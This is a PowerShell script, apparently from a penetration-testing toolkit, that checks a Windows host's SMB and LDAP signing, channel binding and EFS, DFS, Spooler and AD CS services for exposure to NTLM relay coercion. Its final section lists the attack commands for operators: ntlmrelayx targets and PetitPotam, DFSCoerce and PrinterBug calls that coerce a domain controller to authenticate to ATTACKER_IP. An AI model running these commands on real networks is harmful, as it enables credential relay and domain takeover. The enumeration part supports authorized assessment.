<#
.SYNOPSIS
    Check this host's signals related to NTLM-relay coercion (PetitPotam,
    DFSCoerce, PrinterBug). Specifically: SMB signing requirement, EFS RPC
    surface, LDAP signing requirement.

.DESCRIPTION
    Coercion + relay attacks (PetitPotam etc.) succeed when:
      1. The coerced host has an attacker-relayable inbound auth path
         (LDAP signing not required / SMB signing not required / WebDAV /
         AD CS HTTP enrollment)
      2. The coerce vector is reachable (\pipe\lsarpc for PetitPotam,
         \pipe\netdfs for DFSCoerce, \pipe\spoolss for PrinterBug)

    This script enumerates THIS host's signaling state across both axes.
    Read-only — no coerce attempted, no pipe binding.

.NOTES
    Authorized testing only. Detection only. The actual coerce + relay
    chain runs from the operator's attacker box via impacket-ntlmrelayx
    + petitpotam.py / dfscoerce.py / printerbug.py.
#>
[CmdletBinding()]
param()

function Hit($t)  { Write-Host "[+] $t" -ForegroundColor Green }
function Miss($t) { Write-Host "[-] $t" -ForegroundColor DarkGray }
function Warn($t) { Write-Host "[!] $t" -ForegroundColor Yellow }
function Hdr($t)  { Write-Host ""; Write-Host ("="*70) -ForegroundColor Cyan
                    Write-Host "  $t" -ForegroundColor Cyan
                    Write-Host ("="*70) -ForegroundColor Cyan }

Hdr "NTLM RELAY / COERCION SIGNALS (THIS HOST)"

# --- SMB signing required? ---
$smbReq = (Get-SmbServerConfiguration -ErrorAction SilentlyContinue).RequireSecuritySignature
"SMB signing required:    $smbReq"
if ($smbReq -ne $true) {
    Warn "SMB signing NOT required — this host is a relay TARGET candidate"
}

# --- LDAP signing required (HKLM lsa policy) ---
$ldap = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -ErrorAction SilentlyContinue
$ldapSigning = $ldap.LDAPServerIntegrity
"LDAPServerIntegrity:     $ldapSigning  (1=None, 2=Require)"
if ($ldapSigning -ne 2 -and (Test-Path 'C:\Windows\NTDS')) {
    Warn "LDAP signing NOT required on DC — relay to LDAP path is open"
}

# --- Channel binding (EPA) on web auth ---
$cba = Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa' -ErrorAction SilentlyContinue
$suppressExtendedProt = $cba.SuppressExtendedProtection
"SuppressExtendedProtection: $suppressExtendedProt"

# --- Coerce vector pipes — are the services running? ---
""
"--- Coerce-vector services ---"
foreach ($svc in @('EFS','DfsR','Dfs','Spooler')) {
    $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
    if ($s) {
        if ($s.Status -eq 'Running') {
            Warn "$svc service running — coerce vector: $(switch($svc){
                'EFS'    {'PetitPotam (\\pipe\\lsarpc EfsRpcOpenFileRaw)'}
                'DfsR'   {'DFSCoerce variant'}
                'Dfs'    {'DFSCoerce (\\pipe\\netdfs)'}
                'Spooler'{'PrinterBug (\\pipe\\spoolss)'}
            })"
        } else {
            Miss "$svc not running"
        }
    }
}

# --- ADCS HTTP enrollment (a relay-to-CA path) ---
""
$adcs_http = Get-Service -Name CertSvc -ErrorAction SilentlyContinue
if ($adcs_http) {
    Warn "CertSvc (AD CS) running — if HTTP enrollment is enabled (port 80/443), relay to /certsrv works (ESC8)"
}

Hdr "NEXT STEPS (operator-driven, attacker box)"
"# 1) Start ntlmrelayx with the right target:"
"#      impacket-ntlmrelayx -t ldap://<DC>      (mint cert / RBCD)"
"#      impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support"
"#      impacket-ntlmrelayx -t smb://<RELAY>    (if smb signing disabled there)"
"# 2) Coerce DC auth back to ATTACKER_IP:"
"#      petitpotam.py -u U -p P -d D ATTACKER_IP DC_IP"
"#      dfscoerce.py  ATTACKER_IP DC_IP -u U -p P -d D"
"#      printerbug.py D/U:P@DC ATTACKER_IP"
